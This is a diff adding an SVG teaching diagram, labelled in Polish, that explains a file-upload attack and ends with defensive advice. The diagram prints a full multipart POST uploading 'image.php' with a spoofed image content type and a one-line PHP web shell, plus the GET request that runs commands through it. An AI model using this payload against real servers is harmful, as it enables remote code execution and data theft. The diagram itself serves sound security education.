@@ -1,0 +1,62 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080" viewBox="0 0 1920 1080">
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0%" stop-color="#f5f9ff"/>
+      <stop offset="100%" stop-color="#fff8f5"/>
+    </linearGradient>
+    <filter id="soft" x="-20%" y="-20%" width="140%" height="140%">
+      <feGaussianBlur in="SourceGraphic" stdDeviation="0"/>
+    </filter>
+  </defs>
+  <rect width="1920" height="1080" fill="url(#bg)"/>
+  <!-- watercolor blobs -->
+  <ellipse cx="120" cy="100" rx="200" ry="120" fill="#ffd6e8" opacity="0.5"/>
+  <ellipse cx="1800" cy="120" rx="180" ry="110" fill="#c8e6ff" opacity="0.5"/>
+  <ellipse cx="1700" cy="950" rx="220" ry="100" fill="#fff3b0" opacity="0.45"/>
+  <ellipse cx="150" cy="920" rx="160" ry="90" fill="#d4f5e9" opacity="0.4"/>
+  <text x="960" y="88" text-anchor="middle" font-family="Segoe UI,system-ui,sans-serif" font-size="44" font-weight="700" fill="#1e3a5f">Skrajnie technicznie — image.php (tylko atakujący)</text>
+  <text x="960" y="128" text-anchor="middle" font-size="22" fill="#555">Bez ofiary, bez proxy: sam upload + celowo sfałszowane nagłówki</text>
+  <!-- simple ludzik attacker -->
+  <g transform="translate(100,200)">
+    <circle cx="60" cy="40" r="36" fill="#2d3436"/>
+    <rect x="25" y="78" width="70" height="90" rx="14" fill="#4a69bd"/>
+    <text x="60" y="200" text-anchor="middle" font-size="18" fill="#333">Atakujący</text>
+  </g>
+  <!-- POST panel -->
+  <rect x="280" y="170" width="720" height="520" rx="16" fill="#1a1a2e" stroke="#e94560" stroke-width="3"/>
+  <text x="310" y="215" fill="#ff6b8a" font-family="ui-monospace,monospace" font-size="20" font-weight="700">POST /upload HTTP/1.1</text>
+  <text x="310" y="250" fill="#a8e6cf" font-family="ui-monospace,monospace" font-size="17">Content-Type: multipart/form-data; boundary=----x</text>
+  <text x="310" y="290" fill="#888" font-family="ui-monospace,monospace" font-size="15">------x</text>
+  <text x="310" y="320" fill="#ffd93d" font-family="ui-monospace,monospace" font-size="16">Content-Disposition: form-data; name="file"; filename="image.php"</text>
+  <text x="310" y="355" fill="#ffd93d" font-family="ui-monospace,monospace" font-size="16">Content-Type: image/jpeg</text>
+  <text x="730" y="355" fill="#ff6b8a" font-size="14">← celowo sfałszowane</text>
+  <text x="310" y="390" fill="#888" font-family="ui-monospace,monospace" font-size="15">(pusta linia)</text>
+  <text x="310" y="425" fill="#fff" font-family="ui-monospace,monospace" font-size="17">GIF89a;</text>
+  <text x="400" y="425" fill="#888" font-size="14">opcjonalnie</text>
+  <text x="310" y="465" fill="#ff9f43" font-family="ui-monospace,monospace" font-size="17">&lt;?php system($_GET['cmd']); ?&gt;</text>
+  <text x="310" y="505" fill="#888" font-family="ui-monospace,monospace" font-size="15">------x--</text>
+  <rect x="310" y="540" width="660" height="120" rx="10" fill="#2d3436"/>
+  <text x="330" y="575" fill="#dfe6e9" font-size="16">Backend „głupi”: wierzy w Content-Type i/lub nie ma allow-listy — zapisuje uploads/image.php</text>
+  <text x="330" y="610" fill="#dfe6e9" font-size="16">Nie sprawdza: rozszerzenia .php, magic bytes, brak wykonania w katalogu</text>
+  <!-- flow right -->
+  <rect x="1060" y="200" width="760" height="140" rx="14" fill="#fff3cd" stroke="#e0a800" stroke-width="2"/>
+  <text x="1080" y="245" font-size="24" font-weight="700" fill="#1e3a5f">① Zapis</text>
+  <text x="1080" y="285" font-family="ui-monospace,monospace" font-size="19" fill="#333">/var/www/public/uploads/image.php</text>
+  <text x="1080" y="318" font-size="17" fill="#555">Treść = bajty z body (nagłówek GIF + PHP)</text>
+  <path d="M 1440 350 L 1440 400" stroke="#1e3a5f" stroke-width="3" marker-end="url(#a)"/>
+  <defs><marker id="a" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#1e3a5f"/></marker></defs>
+  <rect x="1060" y="410" width="760" height="160" rx="14" fill="#d4edda" stroke="#28a745" stroke-width="2"/>
+  <text x="1080" y="455" font-size="24" font-weight="700" fill="#1e3a5f">② Wywołanie</text>
+  <text x="1080" y="495" font-family="ui-monospace,monospace" font-size="19" fill="#333">GET /uploads/image.php?cmd=cat%20secret HTTP/1.1</text>
+  <text x="1080" y="535" font-size="17" fill="#333">Apache mod_php → wykonanie kodu (RCE / web shell)</text>
+  <rect x="1060" y="600" width="760" height="90" rx="14" fill="#f8d7da" stroke="#c0392b" stroke-width="2"/>
+  <text x="1080" y="655" font-size="20" fill="#c0392b" font-weight="600">Skutek: odczyt plików, baza, backdoor — pełna kontrola procesu WWW</text>
+  <rect x="80" y="860" width="1760" height="88" rx="14" fill="#ffc107"/>
+  <text x="960" y="910" text-anchor="middle" font-size="22" font-weight="700" fill="#1e3a5f">Lekcja: allow-lista rozszerzeń + magic bytes + brak PHP w uploads + losowa nazwa</text>
+  <!-- ludzik server small -->
+  <g transform="translate(1680,720)">
+    <rect x="0" y="0" width="90" height="120" rx="8" fill="#2d3436"/>
+    <circle cx="25" cy="25" r="6" fill="#00ff00"/><circle cx="45" cy="25" r="6" fill="#00ff00"/>
+    <text x="45" y="-15" text-anchor="middle" font-size="14" fill="#333">Serwer</text>
+  </g>
+</svg>
